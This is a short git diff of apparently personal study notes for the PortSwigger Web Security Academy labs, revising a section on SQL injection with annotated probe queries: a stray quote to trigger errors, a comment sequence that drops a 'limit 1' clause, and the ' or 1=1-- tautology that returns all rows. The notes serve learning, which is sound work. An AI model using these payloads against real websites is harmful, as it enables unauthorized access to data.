@@ -10,14 +10,12 @@ https://portswigger.net/web-security/all-labs
 
 	<SQL Injection>
 	
-	
-	-SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
 		
-		select * from customers where city = 'london'					|| show only city 
-		select * from customers where city = 'london' or 1=1--			|| or 1=1-- will return all city which means true
-		
-		w3schoolos.com/filter?category=Pets'+or+1=1--					|| will return all categories
-		
+select * from customers where city = 'london'					|| show only city 
+select * from customers where city = ''' 					|| if this '/'' pass, then sql query syntx will be like.. it returns errors if its vulnerable  
+select * from customers where city = ''--' limit 1				|| if this '-- pass, then sql query omit 'limit 1' condition  
+						
+select * from customers where city = 'london' or 1=1--				|| or 1=1-- will return all city which means true / encode url 
 		
 	- SQL injection vulnerability allowing login bypass
 		 
